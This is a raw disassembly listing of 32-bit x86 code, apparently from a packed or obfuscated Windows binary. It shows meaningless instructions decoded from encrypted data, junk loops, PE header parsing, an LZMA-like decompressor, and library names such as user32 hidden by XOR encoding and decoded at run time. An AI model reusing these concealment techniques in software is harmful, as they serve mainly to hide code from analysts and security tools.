  423dec:	in     al,0xe7
  423dee:	int3   
  423def:	(bad)  
  423df0:	jl     0x423dce
  423df2:	dec    esi
  423df3:	fs cwde 
  423df5:	or     edi,ebx
  423df7:	sbb    esi,DWORD PTR [ecx-0x57f2930d]
  423dfd:	in     eax,dx
  423dfe:	pop    edi
  423dff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e00:	jg     0x423e09
  423e02:	sub    eax,0xbb763c13
  423e07:	or     ch,BYTE PTR [edi-0x4474d460]
  423e0d:	xor    eax,eax
  423e0f:	jae    0x423dae
  423e11:	cdq    
  423e12:	cld    
  423e13:	pop    ebp
  423e14:	xchg   esi,eax
  423e15:	push   cs
  423e16:	mov    WORD PTR [edi+0x11],cs
  423e19:	cs dec edx
  423e1b:	daa    
  423e1c:	dec    edx
  423e1d:	jle    0x423de4
  423e1f:	sar    bh,cl
  423e21:	je     0x423ddd
  423e23:	(bad)  
  423e24:	in     al,dx
  423e25:	add    bl,BYTE PTR [esi+eax*2+0x57]
  423e29:	call   0xd4143ed9
  423e2e:	or     edx,DWORD PTR [ecx-0x46fd6198]
  423e34:	mov    dh,0xc6
  423e36:	out    0x33,eax
  423e38:	jge    0x423e0c
  423e3a:	xlat   BYTE PTR ds:[ebx]
  423e3b:	dec    esp
  423e3c:	inc    edx
  423e3d:	adc    ebp,DWORD PTR [edi+0x6a]
  423e40:	ds jg  0x423e72
  423e43:	push   ss
  423e44:	aaa    
  423e45:	add    eax,0xc59549a0
  423e4a:	outs   dx,DWORD PTR ds:[esi]
  423e4b:	adc    al,0x62
  423e4d:	leave  
  423e4e:	stc    
  423e4f:	test   BYTE PTR [ebp+0x3e],bh
  423e52:	aam    0x88
  423e54:	call   0x9b8:0x921a072d
  423e5b:	push   edi
  423e5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e5d:	add    al,0x80
  423e5f:	xor    al,BYTE PTR [edi+0x23]
  423e62:	mov    ds:0x29362400,eax
  423e67:	fistp  DWORD PTR [eax-0x43]
  423e6a:	(bad)  
  423e6b:	in     eax,0x9c
  423e6d:	add    BYTE PTR [ecx-0x285ee324],bh
  423e73:	jno    0x423e50
  423e75:	push   ebx
  423e76:	mov    eax,ds:0x971e366
  423e7b:	call   0xf87656d9
  423e80:	ja     0x423e44
  423e82:	fcomp  st(3)
  423e84:	mov    eax,ds:0xb6681774
  423e89:	test   al,0x72
  423e8b:	cmp    BYTE PTR [esi],0x6c
  423e8e:	mov    edi,edx
  423e90:	cld    
  423e91:	jnp    0x423ef4
  423e93:	jnp    0x423eb0
  423e95:	jmp    0xdea5:0x2b4fa046
  423e9c:	xor    BYTE PTR [ebx+0x520c112d],0x1f
  423ea3:	int    0x44
  423ea5:	arpl   bp,bp
  423ea7:	dec    esi
  423ea8:	fdivr  st,st(4)
  423eaa:	cmp    DWORD PTR [eax+ecx*4-0x14],edi
  423eae:	pop    esi
  423eaf:	stos   DWORD PTR es:[edi],eax
  423eb0:	jns    0x423e5e
  423eb2:	jg     0x423e46
  423eb4:	sub    eax,0x4f3e45ac
  423eb9:	call   0x98ed:0xb46a1ec9
  423ec0:	cmp    BYTE PTR [edi+eiz*8-0x74e886ed],0x6f
  423ec8:	xchg   ebx,eax
  423ec9:	add    eax,0xd218987b
  423ece:	pop    esi
  423ecf:	and    edi,edx
  423ed1:	jne    0x423f24
  423ed3:	xor    ecx,DWORD PTR [eax+0xb4cc8ba]
  423ed9:	mov    edi,0xad92210e
  423ede:	jp     0x423ee4
  423ee0:	test   bl,ch
  423ee2:	pop    edx
  423ee3:	nop
  423ee4:	ret    0x6119
  423ee7:	rol    BYTE PTR [ebx-0x3e74ff0d],0x5
  423eee:	iret   
  423eef:	mov    esi,0xd783fabd
  423ef4:	push   DWORD PTR ds:0x8a29a145
  423efa:	xor    edi,0x0
  423efd:	cmp    eax,esi
  423eff:	jne    0x421ae1
  423f05:	cmp    edi,ebx
  423f07:	jne    0x421ae1
  423f0d:	mov    eax,0xf89c85b8
  423f12:	pop    ebx
  423f13:	pop    edi
  423f14:	pop    esi
  423f15:	leave  
  423f16:	ret    0xc
  423f19:	push   ebp
  423f1a:	mov    ebp,esp
  423f1c:	push   ecx
  423f1d:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  423f24:	and    edx,ecx
  423f26:	mov    eax,DWORD PTR [ebp+0x8]
  423f29:	and    DWORD PTR ds:0x428e95,edi
  423f2f:	movsx  eax,BYTE PTR [eax]
  423f32:	sub    edx,ecx
  423f34:	mov    edx,0x3272f8
  423f39:	xor    ecx,ecx
  423f3b:	add    ecx,DWORD PTR ds:0x428e9d
  423f41:	and    DWORD PTR ds:0x428e71,ecx
  423f47:	sub    eax,edx
  423f49:	mov    ecx,0x75108b1
  423f4e:	sub    DWORD PTR ds:0x428e29,0x428e25
  423f58:	xor    eax,ecx
  423f5a:	cmp    eax,0xf89c85e4
  423f5f:	mov    DWORD PTR ds:0x428e9d,0x7b75
  423f69:	jne    0x423ff4
  423f6f:	and    DWORD PTR ds:0x428e25,0x0
  423f79:	mov    eax,ds:0x428e25
  423f7e:	inc    eax
  423f7f:	mov    ds:0x428e25,eax
  423f84:	cmp    DWORD PTR ds:0x428e25,0x6
  423f8b:	jbe    0x423fcb
  423f91:	jmp    0x423fa6
  423f96:	push   0x42804e
  423f9b:	push   DWORD PTR [ebp-0xc]
  423f9e:	push   0x0
  423fa0:	call   DWORD PTR ds:0x42ca4c
  423fa6:	cmp    DWORD PTR ds:0x428e25,0x5
  423fad:	jne    0x423fbe
  423fb3:	mov    eax,ds:0x428e25
  423fb8:	inc    eax
  423fb9:	mov    ds:0x428e25,eax
  423fbe:	cmp    DWORD PTR ds:0x428e25,0x1a
  423fc5:	jb     0x423f79
  423fcb:	mov    eax,DWORD PTR [ebp+0x8]
  423fce:	push   esi
  423fcf:	mov    esi,DWORD PTR [ebp+0x8]
  423fd2:	add    esi,DWORD PTR [eax+0x3c]
  423fd5:	mov    DWORD PTR [ebp+0x8],esi
  423fd8:	mov    eax,DWORD PTR [ebp-0x4]
  423fdb:	mov    esi,DWORD PTR [ebp+0x8]
  423fde:	xor    eax,ecx
  423fe0:	add    eax,edx
  423fe2:	cmp    DWORD PTR [esi+0x54],eax
  423fe5:	pop    esi
  423fe6:	je     0x423ff4
  423fec:	mov    eax,DWORD PTR [ebp+0x8]
  423fef:	jmp    0x423ffb
  423ff4:	mov    eax,DWORD PTR [ebp-0x4]
  423ff7:	xor    eax,ecx
  423ff9:	add    eax,edx
  423ffb:	leave  
  423ffc:	ret    0x4
  423fff:	push   ebp
  424000:	mov    ebp,esp
  424002:	sub    esp,0xc
  424005:	adc    DWORD PTR ds:0x428e71,ebx
  42400b:	push   esi
  42400c:	or     ecx,0x44ac
  424012:	mov    eax,0xf89c85b9
  424017:	mov    DWORD PTR ds:0x428eb5,0x14
  424021:	cmp    DWORD PTR ds:0x428eb5,0x0
  424028:	je     0x42405d
  42402e:	cmp    DWORD PTR ds:0x428eb5,0x1d
  424035:	jb     0x42405d
  42403b:	jmp    0x424049
  424040:	push   DWORD PTR [ebp-0x24]
  424043:	call   DWORD PTR ds:0x42ca50
  424049:	xor    edx,edx
  42404b:	add    edx,DWORD PTR ds:0x428eb5
  424051:	dec    edx
  424052:	mov    DWORD PTR ds:0x428eb5,edx
  424058:	jmp    0x424021
  42405d:	mov    DWORD PTR [ebp-0x8],eax
  424060:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  424067:	and    DWORD PTR ds:0x428e65,0x0
  424071:	jmp    0x424083
  424076:	mov    ecx,DWORD PTR ds:0x428e65
  42407c:	inc    ecx
  42407d:	mov    DWORD PTR ds:0x428e65,ecx
  424083:	cmp    DWORD PTR ds:0x428e65,0x19
  42408a:	jae    0x4240c5
  424090:	cmp    DWORD PTR ds:0x428e65,0x1b
  424097:	jle    0x4240c5
  42409d:	jmp    0x4240c0
  4240a2:	push   DWORD PTR [ebp-0xc]
  4240a5:	push   0x1fe6
  4240aa:	push   DWORD PTR [ebp-0x1c]
  4240ad:	push   DWORD PTR [ebp-0xc]
  4240b0:	push   0x428124
  4240b5:	push   0x1d19
  4240ba:	call   DWORD PTR ds:0x42ca10
  4240c0:	jmp    0x424076
  4240c5:	mov    esi,DWORD PTR [ebp-0x4]
  4240c8:	xor    DWORD PTR ds:0x428e35,0x687d
  4240d2:	push   edi
  4240d3:	mov    DWORD PTR ds:0x428e8d,0x1d
  4240dd:	cmp    DWORD PTR ds:0x428e8d,0x0
  4240e4:	je     0x42412b
  4240ea:	cmp    DWORD PTR ds:0x428e8d,0x26
  4240f1:	ja     0x42412b
  4240f7:	jmp    0x424119
  4240fc:	push   0x4877
  424101:	push   0x5dd2
  424106:	push   0x3bfb
  42410b:	push   DWORD PTR [ebp-0x24]
  42410e:	push   0x428e91
  424113:	call   DWORD PTR ds:0x42ca14
  424119:	mov    ecx,DWORD PTR ds:0x428e8d
  42411f:	dec    ecx
  424120:	mov    DWORD PTR ds:0x428e8d,ecx
  424126:	jmp    0x4240dd
  42412b:	mov    edi,DWORD PTR [ebp-0x8]
  42412e:	mov    ecx,0x75108b1
  424133:	xor    esi,ecx
  424135:	xor    edi,ecx
  424137:	mov    edx,0x3272f8
  42413c:	add    edi,edx
  42413e:	add    esi,edx
  424140:	imul   esi,edi
  424143:	mov    edi,DWORD PTR [ebp+0xc]
  424146:	cmp    edi,esi
  424148:	je     0x42419d
  42414e:	mov    DWORD PTR [ebp-0xc],eax
  424151:	mov    eax,DWORD PTR [ebp-0xc]
  424154:	mov    esi,DWORD PTR [ebp+0xc]
  424157:	xor    eax,ecx
  424159:	lea    eax,[eax*8+0x1939838]
  424160:	mov    eax,DWORD PTR [esi+eax*1]
  424163:	mov    DWORD PTR [ebp+0xc],eax
  424166:	mov    eax,DWORD PTR [ebp-0x4]
  424169:	mov    esi,DWORD PTR [ebp-0x8]
  42416c:	xor    eax,ecx
  42416e:	xor    esi,ecx
  424170:	add    esi,edx
  424172:	add    eax,edx
  424174:	imul   eax,esi
  424177:	mov    esi,DWORD PTR [ebp+0xc]
  42417a:	cmp    esi,eax
  42417c:	je     0x42419d
  424182:	mov    eax,DWORD PTR [ebp-0x4]
  424185:	xor    eax,ecx
  424187:	mov    ecx,DWORD PTR [ebp+0xc]
  42418a:	add    eax,edx
  42418c:	imul   eax,ecx
  42418f:	add    eax,DWORD PTR [ebp+0x8]
  424192:	mov    DWORD PTR [ebp+0xc],eax
  424195:	mov    eax,DWORD PTR [ebp+0xc]
  424198:	jmp    0x4241ae
  42419d:	mov    eax,DWORD PTR [ebp-0x4]
  4241a0:	mov    esi,DWORD PTR [ebp-0x8]
  4241a3:	xor    esi,ecx
  4241a5:	xor    eax,ecx
  4241a7:	add    esi,edx
  4241a9:	add    eax,edx
  4241ab:	imul   eax,esi
  4241ae:	pop    edi
  4241af:	pop    esi
  4241b0:	leave  
  4241b1:	ret    0x8
	...
  4241c4:	iret   
  4241c5:	lods   eax,DWORD PTR ds:[esi]
  4241c6:	mov    ecx,DWORD PTR [ebp+0x0]
  4241c9:	add    BYTE PTR [eax],al
  4241cb:	add    BYTE PTR [edx],al
  4241cd:	add    BYTE PTR [eax],al
  4241cf:	add    BYTE PTR [ecx+0x0],al
  4241d2:	add    BYTE PTR [eax],al
  4241d4:	loopne 0x424217
  4241d6:	add    al,BYTE PTR [eax]
  4241d8:	loopne 0x42420f
  4241da:	add    al,BYTE PTR [eax]
  4241dc:	add    BYTE PTR [eax],al
  4241de:	add    BYTE PTR [eax],al
  4241e0:	push   edx
  4241e1:	push   ebx
  4241e2:	inc    esp
  4241e3:	push   ebx
  4241e4:	and    DWORD PTR [edx-0x410160d5],edi
  4241ea:	pop    esp
  4241eb:	inc    ebx
  4241ec:	cdq    
  4241ed:	shl    BYTE PTR [eax+0x21b19ee9],0xfd
  4241f4:	add    DWORD PTR [eax],eax
  4241f6:	add    BYTE PTR [eax],al
  4241f8:	inc    ebx
  4241f9:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  4241fd:	ins    BYTE PTR es:[edi],dx
  4241fe:	fs gs jb 0x424222
  424202:	outs   dx,DWORD PTR ds:[esi]
  424203:	data16 and BYTE PTR [edi+0x6f],dl
  424207:	jb     0x424274
  424209:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  424210:	push   0x65
  424212:	arpl   WORD PTR [esp+ebx*2+0x50],si
  424216:	jb     0x424287
  424218:	push   0x65
  42421a:	arpl   WORD PTR [esp+edx*2+0x65],si
  42421e:	jae    0x424294
  424220:	add    BYTE PTR [ebx-0x137e13ab],cl
  424226:	or     BYTE PTR [ecx],al
  424228:	add    BYTE PTR [eax],al
  42422a:	push   ebx
  42422b:	mov    eax,ebx
  42422d:	xchg   ecx,eax
  42422e:	mov    eax,DWORD PTR [ebp+0x8]
  424231:	cmp    eax,0xf89c85b9
  424236:	jne    0x4246ce
  42423c:	mov    eax,DWORD PTR [ebp+0xc]
  42423f:	cmp    eax,0xf89c85b8
  424244:	jne    0x4246ce
  42424a:	mov    eax,DWORD PTR [ebp+0x24]
  42424d:	mov    DWORD PTR [ebp-0x4],eax
  424250:	mov    eax,DWORD PTR [ebp-0x4]
  424253:	mov    eax,DWORD PTR [eax+0x1d8]
  424259:	mov    eax,DWORD PTR [eax]
  42425b:	mov    eax,DWORD PTR [eax]
  42425d:	mov    DWORD PTR [ebp-0x8],eax
  424260:	mov    BYTE PTR [ebp-0x18],0xe2
  424264:	mov    BYTE PTR [ebp-0x17],0xdf
  424268:	mov    BYTE PTR [ebp-0x16],0xe4
  42426c:	mov    BYTE PTR [ebp-0x15],0xae
  424270:	mov    BYTE PTR [ebp-0x14],0xad
  424274:	mov    BYTE PTR [ebp-0x13],0x7b
  424278:	mov    BYTE PTR [ebp-0x20],0xf0
  42427c:	mov    BYTE PTR [ebp-0x1f],0xee
  424280:	mov    BYTE PTR [ebp-0x1e],0xe0
  424284:	mov    BYTE PTR [ebp-0x1d],0xed
  424288:	mov    BYTE PTR [ebp-0x1c],0xae
  42428c:	mov    BYTE PTR [ebp-0x1b],0xad
  424290:	mov    BYTE PTR [ebp-0x1a],0x7b
  424294:	mov    BYTE PTR [ebp-0x28],0xee
  424298:	mov    BYTE PTR [ebp-0x27],0xe3
  42429c:	mov    BYTE PTR [ebp-0x26],0xe7
  4242a0:	mov    BYTE PTR [ebp-0x25],0xf2
  4242a4:	mov    BYTE PTR [ebp-0x24],0xdc
  4242a8:	mov    BYTE PTR [ebp-0x23],0xeb
  4242ac:	mov    BYTE PTR [ebp-0x22],0xe4
  4242b0:	mov    BYTE PTR [ebp-0x21],0x7b
  4242b4:	xor    ecx,ecx
  4242b6:	lea    eax,[ebp+ecx*1-0x18]
  4242ba:	movzx  edx,BYTE PTR [eax]
  4242bd:	xor    edx,0x80
  4242c3:	add    edx,0x5
  4242c6:	inc    ecx
  4242c7:	mov    BYTE PTR [eax],dl
  4242c9:	cmp    ecx,0x6
  4242cc:	jb     0x4242b6
  4242ce:	xor    ecx,ecx
  4242d0:	lea    eax,[ebp+ecx*1-0x20]
  4242d4:	movzx  edx,BYTE PTR [eax]
  4242d7:	xor    edx,0x80
  4242dd:	add    edx,0x5
  4242e0:	inc    ecx
  4242e1:	mov    BYTE PTR [eax],dl
  4242e3:	cmp    ecx,0x7
  4242e6:	jb     0x4242d0
  4242e8:	xor    ecx,ecx
  4242ea:	lea    eax,[ebp+ecx*1-0x28]
  4242ee:	movzx  edx,BYTE PTR [eax]
  4242f1:	xor    edx,0x80
  4242f7:	add    edx,0x5
  4242fa:	inc    ecx
  4242fb:	mov    BYTE PTR [eax],dl
  4242fd:	cmp    ecx,0x8
  424300:	jb     0x4242ea
  424302:	lea    eax,[ebp-0x2c]
  424305:	mov    DWORD PTR [ebp-0x8],eax
  424308:	mov    ecx,DWORD PTR [ebp-0x8]
  42430b:	mov    eax,0x7113fcef
  424310:	push   esi
  424311:	mov    DWORD PTR [ecx],eax
  424313:	mov    ecx,DWORD PTR [ebp-0x2c]
  424316:	mov    esi,0x4e3e
  42431b:	push   edi
  42431c:	lea    edi,[esi-0xa]
  42431f:	mov    ebx,0x3272f8
  424324:	cmp    ecx,eax
  424326:	jne    0x4243f7
  42432c:	lea    eax,[esi+0x39]
  42432f:	mov    WORD PTR [ebp-0x78],ax
  424333:	mov    eax,esi
  424335:	mov    WORD PTR [ebp-0x76],ax
  424339:	add    eax,0x3b
  42433c:	mov    WORD PTR [ebp-0x74],ax
  424340:	lea    eax,[esi-0x6]
  424343:	mov    WORD PTR [ebp-0x72],ax
  424347:	add    eax,0x47
  42434a:	mov    WORD PTR [ebp-0x70],ax
  42434e:	mov    eax,edi
  424350:	mov    WORD PTR [ebp-0x6e],ax
  424354:	mov    eax,0x4f92
  424359:	mov    WORD PTR [ebp-0x6c],ax
  42435d:	lea    eax,[esi-0x9]
  424360:	mov    WORD PTR [ebp-0x6a],ax
  424364:	add    eax,0x30
  424367:	mov    WORD PTR [ebp-0x68],ax
  42436b:	lea    eax,[esi-0xd]
  42436e:	mov    WORD PTR [ebp-0x66],ax
  424372:	mov    eax,esi
  424374:	mov    WORD PTR [ebp-0x64],ax
  424378:	add    eax,0xfffffff4
  42437b:	mov    WORD PTR [ebp-0x62],ax
  42437f:	mov    eax,0x44b
  424384:	mov    WORD PTR [ebp-0x60],ax
  424388:	mov    eax,0x5674
  42438d:	mov    WORD PTR [ebp-0x5e],ax
  424391:	mov    eax,0x6114
  424396:	mov    WORD PTR [ebp-0x5c],ax
  42439a:	mov    eax,0xf1e6
  42439f:	mov    WORD PTR [ebp-0x5a],ax
  4243a3:	mov    eax,edi
  4243a5:	mov    WORD PTR [ebp-0x58],ax
  4243a9:	lea    eax,[ebp-0xe0]
  4243af:	push   eax
  4243b0:	mov    eax,DWORD PTR [ebp+0xc]
  4243b3:	xor    eax,0x75108b1
  4243b8:	add    eax,ebx
  4243ba:	push   eax
  4243bb:	lea    eax,[ebp-0x78]
  4243be:	push   eax
  4243bf:	mov    eax,DWORD PTR [ebp-0x4]
  4243c2:	mov    eax,DWORD PTR [eax+0x198]
  4243c8:	mov    DWORD PTR [ebp-0xe0],0x1
  4243d2:	mov    DWORD PTR [ebp-0xdc],0xffff
  4243dc:	push   DWORD PTR [eax]
  4243de:	mov    eax,DWORD PTR [ebp+0x10]
  4243e1:	call   eax
  4243e3:	mov    DWORD PTR [ebp-0x8],eax
  4243e6:	mov    eax,DWORD PTR [ebp-0x8]
  4243e9:	test   eax,eax
  4243eb:	je     0x4243f7
  4243ed:	xor    DWORD PTR ds:0xe041cdd,0x9f170bcc
  4243f7:	mov    eax,DWORD PTR [ebp-0x4]
  4243fa:	mov    ecx,DWORD PTR [eax+0x18c]
  424400:	xor    eax,eax
  424402:	cmp    DWORD PTR [ecx],eax
  424404:	jne    0x42463e
  42440a:	mov    ecx,DWORD PTR [ebp-0x4]
  42440d:	mov    ecx,DWORD PTR [ecx+0x17c]
  424413:	mov    DWORD PTR [ecx],eax
  424415:	mov    ecx,DWORD PTR [ebp-0x4]
  424418:	mov    ecx,DWORD PTR [ecx+0x180]
  42441e:	mov    DWORD PTR [ecx],eax
  424420:	mov    eax,0x4e69
  424425:	mov    WORD PTR [ebp-0x9c],ax
  42442c:	mov    eax,esi
  42442e:	mov    WORD PTR [ebp-0x9a],ax
  424435:	mov    eax,0x4e79
  42443a:	mov    WORD PTR [ebp-0x98],ax
  424441:	add    eax,0xffffffc0
  424444:	mov    WORD PTR [ebp-0x96],ax
  42444b:	mov    eax,0x4f8e
  424450:	mov    WORD PTR [ebp-0x94],ax
  424457:	mov    eax,0x4e3a
  42445c:	mov    WORD PTR [ebp-0x92],ax
  424463:	mov    eax,esi
  424465:	mov    WORD PTR [ebp-0x8c],ax
  42446c:	mov    eax,0x4e35
  424471:	mov    WORD PTR [ebp-0x8a],ax
  424478:	mov    eax,0x99f9
  42447d:	mov    WORD PTR [ebp-0x88],ax
  424484:	mov    eax,0x8d6a
  424489:	mov    WORD PTR [ebp-0x86],ax
  424490:	mov    eax,0xd66f
  424495:	mov    WORD PTR [ebp-0x84],ax
  42449c:	mov    BYTE PTR [ebp-0x10],0xee
  4244a0:	mov    eax,0xd78b
  4244a5:	mov    WORD PTR [ebp-0x82],ax
  4244ac:	mov    BYTE PTR [ebp-0xf],0xe3
  4244b0:	mov    eax,0x2784
  4244b5:	mov    BYTE PTR [ebp-0xe],0xe7
  4244b9:	mov    WORD PTR [ebp-0x80],ax
  4244bd:	mov    BYTE PTR [ebp-0xd],0xf2
  4244c1:	mov    eax,0x4784
  4244c6:	mov    BYTE PTR [ebp-0xc],0xdc
  4244ca:	mov    WORD PTR [ebp-0x7e],ax
  4244ce:	mov    eax,0x4e3b
  4244d3:	mov    BYTE PTR [ebp-0xb],0xeb
  4244d7:	push   0x8
  4244d9:	mov    BYTE PTR [ebp-0xa],0xe4
  4244dd:	mov    WORD PTR [ebp-0x7c],ax
  4244e1:	mov    BYTE PTR [ebp-0x9],0x7b
  4244e5:	mov    DWORD PTR [ebp-0x90],0x4e344e65
  4244ef:	lea    eax,[ebp-0x10]
  4244f2:	pop    edi
  4244f3:	movzx  ecx,BYTE PTR [eax]
  4244f6:	xor    ecx,0x80
  4244fc:	add    ecx,0x5
  4244ff:	mov    BYTE PTR [eax],cl
  424501:	inc    eax
  424502:	dec    edi
  424503:	jne    0x4244f3
  424505:	mov    DWORD PTR [ebp-0xe0],0x1
  42450f:	lea    eax,[ebp-0x10]
  424512:	mov    DWORD PTR [ebp-0xdc],eax
  424518:	mov    ecx,0x4e66
  42451d:	mov    eax,ecx
  42451f:	mov    WORD PTR [ebp-0x40],ax
  424523:	add    eax,0xd
  424526:	mov    edx,eax
  424528:	mov    WORD PTR [ebp-0x3e],dx
  42452c:	mov    edx,0x4f9b
  424531:	mov    WORD PTR [ebp-0x3c],dx
  424535:	add    edx,0xfffffff8
  424538:	mov    WORD PTR [ebp-0x3a],dx
  42453c:	mov    edx,0x4f8d
  424541:	mov    WORD PTR [ebp-0x38],dx
  424545:	add    edx,0xfffffffb
  424548:	mov    WORD PTR [ebp-0x36],dx
  42454c:	mov    edx,0x4f87
  424551:	mov    WORD PTR [ebp-0x34],dx
  424555:	mov    WORD PTR [ebp-0x32],cx
  424559:	mov    ecx,esi
  42455b:	mov    WORD PTR [ebp-0x30],cx
  42455f:	lea    ecx,[edx-0x1]
  424562:	mov    edx,ecx
  424564:	mov    WORD PTR [ebp-0x54],dx
  424568:	mov    edx,eax
  42456a:	mov    WORD PTR [ebp-0x52],dx
  42456e:	mov    edx,0x4e7b
  424573:	mov    WORD PTR [ebp-0x50],dx
  424577:	mov    WORD PTR [ebp-0x4e],ax
  42457b:	lea    eax,[edx-0xe]
  42457e:	mov    WORD PTR [ebp-0x4c],ax
  424582:	add    eax,0xfffffffb
  424585:	mov    WORD PTR [ebp-0x4a],ax
  424589:	lea    eax,[edx-0x14]
  42458c:	mov    WORD PTR [ebp-0x48],ax
  424590:	mov    WORD PTR [ebp-0x46],cx
  424594:	mov    WORD PTR [ebp-0x44],si
  424598:	mov    ecx,DWORD PTR [ebp+0x8]
  42459b:	movzx  edx,WORD PTR [ebp-0x54]
  42459f:	mov    eax,0x75108b1
  4245a4:	xor    ecx,eax
  4245a6:	add    ecx,ebx
  4245a8:	xor    ecx,edx
  4245aa:	mov    WORD PTR [ebp-0x54],cx
  4245ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4245b1:	xor    ecx,eax
  4245b3:	movzx  eax,WORD PTR [ebp-0x40]
  4245b7:	add    ecx,ebx
  4245b9:	xor    ecx,eax
  4245bb:	xor    eax,eax
  4245bd:	mov    WORD PTR [ebp-0x40],cx
  4245c1:	mov    WORD PTR [ebp-0xf4],ax
  4245c8:	mov    WORD PTR [ebp-0x108],ax
  4245cf:	mov    edi,DWORD PTR [ebp+0x24]
  4245d2:	lea    eax,[ebp-0xf4]
  4245d8:	lea    edx,[ebp-0x54]
  4245db:	mov    DWORD PTR [ebp-0xe0],0x2
  4245e5:	mov    DWORD PTR [ebp-0xdc],eax
  4245eb:	call   0x42702b
  4245f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4245f3:	mov    DWORD PTR [ebp-0xd8],eax
  4245f9:	mov    eax,0x75108b1
  4245fe:	xor    ecx,eax
  424600:	add    ecx,ebx
  424602:	je     0x424621
  424604:	lea    ecx,[ebp-0xe0]
  42460a:	push   ecx
  42460b:	mov    ecx,DWORD PTR [ebp+0xc]
  42460e:	xor    ecx,eax
  424610:	add    ecx,ebx
  424612:	push   ecx
  424613:	lea    eax,[ebp-0x9c]
  424619:	push   eax
  42461a:	mov    eax,DWORD PTR [ebp+0x10]
  42461d:	push   0x0
  42461f:	call   eax
  424621:	mov    edi,DWORD PTR [ebp+0x24]
  424624:	lea    eax,[ebp-0x108]
  42462a:	lea    edx,[ebp-0x40]
  42462d:	mov    DWORD PTR [ebp-0xdc],eax
  424633:	call   0x42702b
  424638:	mov    DWORD PTR [ebp-0xd8],eax
  42463e:	mov    eax,DWORD PTR [ebp+0x14]
  424641:	push   DWORD PTR [ebp-0x4]
  424644:	push   DWORD PTR [ebp+0x20]
  424647:	push   DWORD PTR [ebp+0x1c]
  42464a:	push   DWORD PTR [ebp+0x18]
  42464d:	push   DWORD PTR [ebp+0x10]
  424650:	push   DWORD PTR [ebp+0x8]
  424653:	push   DWORD PTR [ebp+0xc]
  424656:	call   0x4258cc
  42465b:	test   eax,eax
  42465d:	je     0x4246a4
  42465f:	add    DWORD PTR [ebp-0x4],eax
  424662:	push   DWORD PTR [ebp-0x4]
  424665:	lea    esi,[ebp+0x4]
  424668:	call   0x424abc
  42466d:	mov    eax,DWORD PTR [ebp-0x4]
  424670:	mov    eax,DWORD PTR [eax+0x1c8]
  424676:	mov    eax,DWORD PTR [eax]
  424678:	xor    eax,0x75108b1
  42467d:	add    eax,ebx
  42467f:	mov    eax,DWORD PTR [ebp-0x4]
  424682:	jne    0x42469a
  424684:	mov    ecx,DWORD PTR [ebp-0x4]
  424687:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42468d:	push   DWORD PTR [ecx]
  42468f:	mov    eax,DWORD PTR [eax+0x1e0]
  424695:	call   DWORD PTR [eax+0x28]
  424698:	jmp    0x4246a4
  42469a:	mov    eax,DWORD PTR [eax+0x17c]
  4246a0:	mov    eax,DWORD PTR [eax]
  4246a2:	add    DWORD PTR [esi],eax
  4246a4:	mov    eax,DWORD PTR [ebp-0x4]
  4246a7:	mov    eax,DWORD PTR [eax+0x1dc]
  4246ad:	dec    DWORD PTR [eax]
  4246af:	mov    ecx,DWORD PTR [ebp-0x4]
  4246b2:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4246b8:	mov    eax,DWORD PTR [eax]
  4246ba:	lea    eax,[ecx+eax*4]
  4246bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4246c0:	mov    ecx,DWORD PTR [ecx+0x17c]
  4246c6:	mov    eax,DWORD PTR [eax]
  4246c8:	mov    ecx,DWORD PTR [ecx]
  4246ca:	add    DWORD PTR [eax],ecx
  4246cc:	pop    edi
  4246cd:	pop    esi
  4246ce:	pop    ebx
  4246cf:	leave  
  4246d0:	ret    0x20
  4246d3:	push   edi
  4246d4:	push   esi
  4246d5:	push   ebx
  4246d6:	push   ebp
  4246d7:	mov    ebp,esp
  4246d9:	mov    eax,DWORD PTR [ebp+0x24]
  4246dc:	add    DWORD PTR [ebp+0x28],eax
  4246df:	push   eax
  4246e0:	cld    
  4246e1:	mov    esi,DWORD PTR [ebp+0x18]
  4246e4:	add    DWORD PTR [ebp+0x1c],esi
  4246e7:	push   esi
  4246e8:	mov    esi,DWORD PTR [ebp+0x14]
  4246eb:	lods   eax,DWORD PTR ds:[esi]
  4246ec:	xchg   edx,eax
  4246ed:	push   edx
  4246ee:	mov    cl,BYTE PTR [esi-0x2]
  4246f1:	or     eax,0xffffffff
  4246f4:	shl    eax,cl
  4246f6:	not    eax
  4246f8:	push   eax
  4246f9:	mov    cl,dh
  4246fb:	or     eax,0xffffffff
  4246fe:	shl    eax,cl
  424700:	not    eax
  424702:	push   eax
  424703:	add    cl,dl
  424705:	mov    edi,esi
  424707:	sub    esp,0xc
  42470a:	sub    eax,eax
  42470c:	inc    eax
  42470d:	push   eax
  42470e:	push   eax
  42470f:	push   eax
  424710:	push   eax
  424711:	push   eax
  424712:	push   edi
  424713:	sub    esi,esi
  424715:	push   esi
  424716:	or     ebx,0xffffffff
  424719:	mov    eax,0x300
  42471e:	shl    eax,cl
  424720:	lea    ecx,[eax+0x736]
  424726:	mov    eax,0x4000400
  42472b:	shr    ecx,1
  42472d:	rep stos DWORD PTR es:[edi],eax
  42472f:	push   0x5
  424731:	pop    ecx
  424732:	call   0x424a1d
  424737:	loop   0x424732
  424739:	lea    esi,[esi]
  42473b:	lea    edi,[edi]
  42473d:	mov    edi,DWORD PTR [ebp-0x4]
  424740:	mov    eax,DWORD PTR [ebp-0x10]
  424743:	sub    edi,DWORD PTR [ebp+0x24]
  424746:	and    eax,edi
  424748:	mov    DWORD PTR [ebp-0x18],eax
  42474b:	mov    al,0x0
  42474d:	call   0x424a35
  424752:	jne    0x4247ed
  424758:	mov    cl,BYTE PTR [ebp-0xc]
  42475b:	and    edi,DWORD PTR [ebp-0x14]
  42475e:	shl    edi,cl
  424760:	sub    cl,0x8
  424763:	neg    cl
  424765:	shr    esi,cl
  424767:	pop    eax
  424768:	add    edi,esi
  42476a:	pop    esi
  42476b:	lea    edi,[edi+edi*2]
  42476e:	shl    edi,0x8
  424771:	cmp    al,0x7
  424773:	pop    edx
  424774:	lea    ecx,[esi+edi*2+0xe6c]
  42477b:	push   ecx
  42477c:	push   esi
